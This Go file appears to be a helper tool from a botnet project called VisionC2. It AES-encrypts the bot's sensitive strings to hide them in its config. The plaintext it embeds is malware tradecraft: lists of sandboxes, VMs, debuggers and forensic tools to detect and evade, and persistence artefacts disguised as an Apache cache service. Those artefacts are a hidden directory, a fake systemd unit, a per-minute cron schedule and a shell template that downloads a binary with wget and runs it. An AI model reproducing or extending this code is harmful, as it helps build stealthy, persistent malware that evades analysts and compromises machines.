// +build ignore

// crypto.go — Unified AES-128-CTR encrypt/decrypt tool for VisionC2.
// Uses the same 16-byte key derived from the XOR byte functions in opsec.go.
//
// Usage:
//   go run tools/crypto.go encrypt <string>            Encrypt a single string
//   go run tools/crypto.go encrypt-slice <a> <b> ...   Encrypt a string slice (null-separated)
//   go run tools/crypto.go decrypt <hex>               Decrypt a hex blob to string
//   go run tools/crypto.go decrypt-slice <hex>          Decrypt a hex blob to string slice
//   go run tools/crypto.go generate                    Generate all encrypted blobs for config.go
//   go run tools/crypto.go verify                      Verify config.go blobs decrypt correctly

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
)

// Must match the XOR byte functions in bot/opsec.go
var key = []byte{
	0xCC ^ 0xA6, // mew
	0xC3 ^ 0x91, // mewtwo
	0x79 ^ 0xC0, // celebi
	0x4F ^ 0xAA, // jirachi
	0x51 ^ 0x80, // shaymin
	0x75 ^ 0xD1, // phione
	0x4B ^ 0x7C, // manaphy
	0x87 ^ 0x86, // victini
	0xFC ^ 0x7C, // keldeo
	0xD2 ^ 0x54, // meloetta
	0xE9 ^ 0xEC, // genesect
	0x77 ^ 0xF1, // diancie
	0x3B ^ 0x4C, // hoopa
	0x3C ^ 0x9D, // volcanion
	0x6C ^ 0x3C, // magearna
	0x97 ^ 0x33, // marshadow
}

// ============================================================================
// CORE ENCRYPT / DECRYPT
// ============================================================================

func encrypt(plaintext string) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		panic(err)
	}
	ct := make([]byte, len(plaintext))
	cipher.NewCTR(block, iv).XORKeyStream(ct, []byte(plaintext))
	return hex.EncodeToString(append(iv, ct...))
}

func decrypt(encrypted []byte) []byte {
	if len(encrypted) <= aes.BlockSize {
		return nil
	}
	iv := encrypted[:aes.BlockSize]
	ct := encrypted[aes.BlockSize:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	pt := make([]byte, len(ct))
	cipher.NewCTR(block, iv).XORKeyStream(pt, ct)
	return pt
}

func encryptSlice(items []string) string {
	return encrypt(strings.Join(items, "\x00"))
}

func mustHex(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: invalid hex string: %v\n", err)
		os.Exit(1)
	}
	return b
}

// ============================================================================
// VERIFY HELPERS
// ============================================================================

var verifyFails int

func check(name, hexBlob, expected string) {
	got := string(decrypt(mustHex(hexBlob)))
	if got == expected {
		fmt.Printf("OK   %-28s = %q\n", name, got)
	} else {
		fmt.Printf("FAIL %-28s\n  expected: %q\n  got:      %q\n", name, expected, got)
		verifyFails++
	}
}

func checkSlice(name, hexBlob string, expected []string) {
	got := strings.Split(string(decrypt(mustHex(hexBlob))), "\x00")
	joined := strings.Join(got, ", ")
	if len(got) == len(expected) && strings.Join(got, "\x00") == strings.Join(expected, "\x00") {
		display := joined
		if len(display) > 80 {
			display = display[:80] + "..."
		}
		fmt.Printf("OK   %-28s = [%d items] %s\n", name, len(got), display)
	} else {
		fmt.Printf("FAIL %-28s expected %d items, got %d\n", name, len(expected), len(got))
		verifyFails++
	}
}

// ============================================================================
// SUBCOMMANDS
// ============================================================================

func cmdEncrypt(args []string) {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "Usage: crypto encrypt <string>")
		os.Exit(1)
	}
	plaintext := strings.Join(args, " ")
	hexBlob := encrypt(plaintext)
	fmt.Println(hexBlob)
}

func cmdEncryptSlice(args []string) {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "Usage: crypto encrypt-slice <item1> <item2> ...")
		os.Exit(1)
	}
	hexBlob := encryptSlice(args)
	fmt.Println(hexBlob)
}

func cmdDecrypt(args []string) {
	if len(args) != 1 {
		fmt.Fprintln(os.Stderr, "Usage: crypto decrypt <hex>")
		os.Exit(1)
	}
	pt := decrypt(mustHex(args[0]))
	if pt == nil {
		fmt.Fprintln(os.Stderr, "Error: decryption failed (blob too short or invalid)")
		os.Exit(1)
	}
	fmt.Println(string(pt))
}

func cmdDecryptSlice(args []string) {
	if len(args) != 1 {
		fmt.Fprintln(os.Stderr, "Usage: crypto decrypt-slice <hex>")
		os.Exit(1)
	}
	pt := decrypt(mustHex(args[0]))
	if pt == nil {
		fmt.Fprintln(os.Stderr, "Error: decryption failed (blob too short or invalid)")
		os.Exit(1)
	}
	items := strings.Split(string(pt), "\x00")
	for i, item := range items {
		fmt.Printf("[%d] %s\n", i, item)
	}
}

func cmdGenerate() {
	// --- String slices ---
	vmIndicators := []string{
		"vmware", "vbox", "virtualbox", "qemu",
		"firejail", "bubblewrap", "gvisor", "kata",
		"cuckoo", "joesandbox", "cape", "any.run", "hybrid-analysis",
	}
	analysisTools := []string{
		"/usr/bin/strace", "/usr/bin/ltrace", "/usr/bin/gdb",
		"/usr/bin/lldb", "/usr/bin/valgrind", "/usr/bin/perf",
		"/usr/bin/radare2", "/usr/bin/r2", "/usr/bin/rizin",
		"/usr/bin/cutter", "/usr/bin/iaito",
		"/usr/bin/ghidra", "/usr/bin/ghidraRun",
		"/usr/bin/ida", "/usr/bin/ida64", "/usr/bin/idat", "/usr/bin/idat64",
		"/usr/bin/objdump", "/usr/bin/readelf",
		"/usr/bin/retdec-decompiler",
		"/usr/bin/wireshark", "/usr/bin/tshark", "/usr/bin/tcpdump",
		"/usr/bin/ngrep", "/usr/bin/ettercap",
		"/usr/sbin/tcpdump", "/usr/sbin/ettercap",
		"/usr/bin/yara", "/usr/bin/ssdeep",
		"/usr/bin/binwalk", "/usr/bin/foremost",
		"/usr/bin/sysdig", "/usr/bin/bpftrace",
		"/usr/bin/auditd", "/usr/sbin/auditd",
		"/usr/bin/ausearch", "/usr/sbin/ausearch",
		"/usr/bin/fatrace", "/usr/bin/inotifywait",
		"/usr/bin/lynis", "/usr/bin/rkhunter",
		"/usr/bin/chkrootkit", "/usr/sbin/chkrootkit",
		"/usr/bin/clamdscan", "/usr/bin/clamscan",
		"/usr/bin/volatility", "/usr/bin/vol.py",
		"/usr/bin/gcore",
	}
	parentDebuggers := []string{
		"gdb", "lldb", "strace", "ltrace", "radare2", "r2",
		"rizin", "rr", "valgrind", "perf", "ida", "ida64",
		"ghidra", "sysdig", "bpftrace", "frida", "frida-server",
	}

	// --- Single strings ---
	persistRcLocal := "/etc/rc.local"
	persistHiddenDir := "/var/lib/.httpd_cache"
	persistScriptName := ".httpd_check.sh"
	persistBinaryName := ".httpd_worker"
	persistServicePath := "/etc/systemd/system/httpd-cache.service"
	persistServiceName := "httpd-cache.service"
	persistCronSchedule := "* * * * *"
	daemonEnvKey := "__SSHD_DAEMON"
	speedCachePath := "/tmp/.net_metric"
	instanceLockPath := "/tmp/.net_lock"

	persistServiceContent := "[Unit]\n" +
		"Description=Apache HTTPD Cache Manager\n" +
		"After=network.target\n" +
		"[Service]\n" +
		"ExecStart=/var/lib/.httpd_cache/.httpd_check.sh\n" +
		"Restart=always\n" +
		"RestartSec=60\n" +
		"[Install]\n" +
		"WantedBy=multi-user.target\n"

	persistScriptTemplate := "#!/bin/bash\n" +
		"URL=\"%s\"\n" +
		"PROGRAM_PATH=\"%s\"\n" +
		"if [ ! -f \"$PROGRAM_PATH\" ]; then\n" +
		"wget -O $PROGRAM_PATH $URL\n" +
		"chmod +x $PROGRAM_PATH\n" +
		"fi\n" +
		"if ! pgrep -x \"%s\" > /dev/null; then\n" +
		"$PROGRAM_PATH &\n" +
		"fi\n"

	fmt.Println("// --- Paste into config.go (encrypted sensitive strings) ---")
	fmt.Println()
	fmt.Printf("var encVmIndicators, _ = hex.DecodeString(\"%s\")\n", encryptSlice(vmIndicators))
	fmt.Printf("var encAnalysisTools, _ = hex.DecodeString(\"%s\")\n", encryptSlice(analysisTools))
	fmt.Printf("var encParentDebuggers, _ = hex.DecodeString(\"%s\")\n", encryptSlice(parentDebuggers))
	fmt.Println()
	fmt.Printf("var encPersistRcLocal, _ = hex.DecodeString(\"%s\")\n", encrypt(persistRcLocal))
	fmt.Printf("var encPersistHiddenDir, _ = hex.DecodeString(\"%s\")\n", encrypt(persistHiddenDir))
	fmt.Printf("var encPersistScriptName, _ = hex.DecodeString(\"%s\")\n", encrypt(persistScriptName))
	fmt.Printf("var encPersistBinaryName, _ = hex.DecodeString(\"%s\")\n", encrypt(persistBinaryName))
	fmt.Printf("var encPersistServicePath, _ = hex.DecodeString(\"%s\")\n", encrypt(persistServicePath))
	fmt.Printf("var encPersistServiceName, _ = hex.DecodeString(\"%s\")\n", encrypt(persistServiceName))
	fmt.Printf("var encPersistServiceContent, _ = hex.DecodeString(\"%s\")\n", encrypt(persistServiceContent))
	fmt.Printf("var encPersistScriptTemplate, _ = hex.DecodeString(\"%s\")\n", encrypt(persistScriptTemplate))
	fmt.Printf("var encPersistCronSchedule, _ = hex.DecodeString(\"%s\")\n", encrypt(persistCronSchedule))
	fmt.Println()
	fmt.Printf("var encDaemonEnvKey, _ = hex.DecodeString(\"%s\")\n", encrypt(daemonEnvKey))
	fmt.Printf("var encSpeedCachePath, _ = hex.DecodeString(\"%s\")\n", encrypt(speedCachePath))
	fmt.Printf("var encInstanceLockPath, _ = hex.DecodeString(\"%s\")\n", encrypt(instanceLockPath))
}

func cmdVerify() {
	fmt.Println("=== Verifying AES-128-CTR decryption of config.go blobs ===")
	fmt.Println()

	checkSlice("vmIndicators",
		"38862d4de406eab7b94b2051f9663397e5aced47549cbefc25691f20029f40707db41cca898e0ffaca98a6648df26e8e8cb4e5d8b16058fd52c245c22edacd25705906420cc9b9fa0d2c861d3f2d5c53b3ffc3aeead67775ee9bf7843d17fe75a2911280e2bd383353f1c99362b2d83e2374fe0726f3f9249ca6",
		[]string{"vmware", "vbox", "virtualbox", "qemu", "firejail", "bubblewrap", "gvisor", "kata", "cuckoo", "joesandbox", "cape", "any.run", "hybrid-analysis"})

	checkSlice("parentDebuggers",
		"aa4c983a58eb6853b1ade123560734f8011d866e2419e2f9a951d07167fc15e22a3644e49851db10b5be6e14dd66e90f17916b45b41e8e541cc2434e8ec659adfb5d8b62547adb7ff8a438c9a36d3883fb852090a9dc1b3a399731a91e2438a1d3670368a13acde92b4eb01edb73da57be4057825135f3d3a8846bf6",
		[]string{"gdb", "lldb", "strace", "ltrace", "radare2", "r2", "rizin", "rr", "valgrind", "perf", "ida", "ida64", "ghidra", "sysdig", "bpftrace", "frida", "frida-server"})

	check("persistRcLocal", "fd1e351140329314766fbfa3a78eb22108548722496ed6bb364d1cf32a", "/etc/rc.local")
	check("persistHiddenDir", "0127318e19f52b9b77e2cefcef221076e307880f518c849758c73378c7faab6eab7d5ca768", "/var/lib/.httpd_cache")
	check("persistScriptName", "a1d704b9a371f9bf5156ab19617fd3777bfd3e0c22984851f086885dd2a6c5", ".httpd_check.sh")
	check("persistBinaryName", "0928a1d88c2970e07cd0ae66606100cd53728cb8af127b4dee7edb9935", ".httpd_worker")
	check("persistServicePath", "e00693030b47e46452d4ebce46d7331edccdf250cdd65d55974c68d9fcf614f53c54c99cf956f9549e9bd7a16bfb972ff933287ee50f1f", "/etc/systemd/system/httpd-cache.service")
	check("persistServiceName", "7ee28a2fc20f9bc130d92ffe50ce17235547dfa4914cda51360706b78212d4e0d5c1b3", "httpd-cache.service")
	check("persistCronSchedule", "5e5e1bbea8b44711deb58433af2ac7a136efe8e79bc0d57dc9", "* * * * *")
	check("daemonEnvKey", "727f0bd942c297be27a3461b397cac6194a37859398e6ffc8c5359ceff", "__SSHD_DAEMON")
	check("speedCachePath", "d6525c338705990e7655bc29f57161d1a7aec2b998db1f167d1f27c68c1b21a9", "/tmp/.net_metric")
	check("instanceLockPath", "e651c7eb3f9f66684d0a05ccc131b0f135a9a91c4b6f74832825e892a760", "/tmp/.net_lock")

	fmt.Println()
	if verifyFails > 0 {
		fmt.Printf("FAILED: %d check(s) did not match.\n", verifyFails)
		os.Exit(1)
	}
	fmt.Println("All checks passed.")
}

// ============================================================================
// MAIN
// ============================================================================

func usage() {
	fmt.Fprintf(os.Stderr, `Usage: go run tools/crypto.go <command> [args...]

Commands:
  encrypt <string>              Encrypt a plaintext string, output hex blob
  encrypt-slice <a> <b> ...     Encrypt multiple strings as null-separated slice
  decrypt <hex>                 Decrypt a hex blob to plaintext string
  decrypt-slice <hex>           Decrypt a hex blob to null-separated string slice
  generate                      Generate all encrypted blobs for config.go
  verify                        Verify config.go blobs decrypt correctly
`)
	os.Exit(1)
}

func main() {
	if len(os.Args) < 2 {
		usage()
	}

	cmd := os.Args[1]
	args := os.Args[2:]

	switch cmd {
	case "encrypt":
		cmdEncrypt(args)
	case "encrypt-slice":
		cmdEncryptSlice(args)
	case "decrypt":
		cmdDecrypt(args)
	case "decrypt-slice":
		cmdDecryptSlice(args)
	case "generate":
		cmdGenerate()
	case "verify":
		cmdVerify()
	default:
		fmt.Fprintf(os.Stderr, "Unknown command: %s\n\n", cmd)
		usage()
	}
}
